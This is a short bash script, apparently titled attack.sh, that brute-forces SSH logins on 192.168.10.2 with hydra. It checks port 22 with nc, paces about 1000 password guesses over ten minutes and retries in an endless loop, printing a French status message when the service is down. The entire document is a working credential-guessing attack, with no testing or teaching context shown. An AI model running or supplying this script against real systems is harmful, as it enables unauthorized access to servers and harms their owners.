
#attack.sh
#!/bin/bash
TARGET_IP=192.168.10.2
USER_LIST="admin"
PASS_LIST="passwords.txt"
TOTAL_ATTEMPTS=1000
DURATION_MINUTES=10
DELAY=$((DURATION_MINUTES * 60 / TOTAL_ATTEMPTS))
SSH_CHECK_INTERVAL=10

function check_ssh {
  nc -z -w $SSH_CHECK_INTERVAL $TARGET_IP 22
}

while true; do
  if check_ssh; then
    hydra -L $USER_LIST -P $PASS_LIST -t 1 -f -v -e nsr -s 22 -u -w $DELAY ssh://$TARGET_IP
  else
    echo "Le service SSH est actuellement indisponible. Tentative de reconnexion dans $SSH_CHECK_INTERVAL secondes."
    sleep $SSH_CHECK_INTERVAL
  fi
done